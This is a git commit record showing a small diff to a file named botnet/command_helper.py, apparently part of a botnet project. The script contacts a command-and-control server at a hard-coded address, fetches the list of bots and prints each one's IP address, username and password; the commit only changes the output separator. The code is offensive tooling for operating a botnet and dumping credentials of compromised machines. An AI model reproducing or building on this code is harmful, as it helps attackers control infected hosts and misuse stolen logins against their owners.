111cbfc78dea57fcfd9142624a1add5926519a06
KSTARK007 <kiranhombal98@gmail.com>
2020-03-18 01:50:38 +0530

    minor bug fix

--- botnet/command_helper.py
+++ botnet/command_helper.py
@@ -6,4 +6,4 @@ cnc = "http://192.168.29.74:5000"
 r=requests.get(url=cnc+"/getBots")
 data = r.json()
 for i in data.keys():
-	print(data[i]["ip"]+";"+data[i]["username"]+";"+data[i]["password"])
+	print(data[i]["ip"]+","+data[i]["username"]+","+data[i]["password"])
